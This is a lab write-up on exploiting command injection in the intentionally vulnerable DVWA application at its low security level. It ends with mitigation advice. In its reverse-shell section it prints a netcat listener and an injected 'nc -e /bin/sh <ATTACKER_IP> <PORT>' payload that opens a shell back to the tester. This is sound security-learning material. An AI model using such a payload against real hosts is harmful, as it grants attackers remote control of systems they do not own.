# DVWA Command Execution — Low Security Level

## Overview

I used the **Low security level** of Damn Vulnerable Web Application (DVWA) to understand how insufficient input validation can lead to operating system command execution.

The application accepts user-controlled input that is incorporated into a system command. Because the input is not properly restricted at this security level, command chaining can be used to execute additional commands.

## Command Chaining

A semicolon (`;`) can be used in a shell to separate commands. This means that when user input is passed unsafely to a shell command, an attacker may be able to append an additional command.

For example, conceptually:

```text
original_input; additional_command
```

The additional command is then processed by the underlying shell.

## Reverse Shell Demonstration

To demonstrate the impact of command execution in the controlled DVWA environment, I used Netcat to establish a reverse shell.

The listener was started on my testing machine:

```text
nc -nvlp <PORT>
```

The vulnerable application was then supplied with a command that caused the DVWA host to initiate a connection back to the testing machine:

```text
<target-input>; nc -e /bin/sh <ATTACKER_IP> <PORT>
```

> The exact command syntax can vary depending on the Netcat implementation available in the lab environment.

Once the connection was established, I was able to interact with the shell exposed by the vulnerable DVWA host and inspect directories and files available to the process.

## What This Demonstrated

This exercise demonstrated that command execution vulnerabilities can have significantly greater impact than simply executing an individual command.

When the vulnerable application runs commands with insufficient restrictions, an attacker may potentially:

* Execute operating system commands
* Access files available to the application
* Enumerate the underlying environment
* Execute additional processes
* Potentially gain further control depending on the privileges of the application

## Why the Vulnerability Occurs

At the Low security level, DVWA does not adequately restrict or safely handle the user-controlled input before it reaches the operating system command.

The core issue is therefore the application's **unsafe handling of untrusted input in a system command**.

## Mitigation

Applications should avoid passing untrusted user input directly to operating system commands.

Where command execution is unavoidable, developers should consider:

* Strict server-side input validation
* Allowlisting expected input values
* Avoiding shell invocation where possible
* Using safer APIs instead of shell commands
* Running applications with the minimum required privileges
* Monitoring and logging suspicious command execution

## Key Takeaway

This lab helped me understand how a basic command execution vulnerability can escalate from executing an additional command to obtaining interactive access to the vulnerable host.

The exercise also reinforced the importance of treating all user-controlled input as untrusted when it is used in operating system commands.

## Evidence

Screenshots from the controlled DVWA lab are included in the `screenshots/` directory.

All testing was performed against an intentionally vulnerable local application for educational purposes.
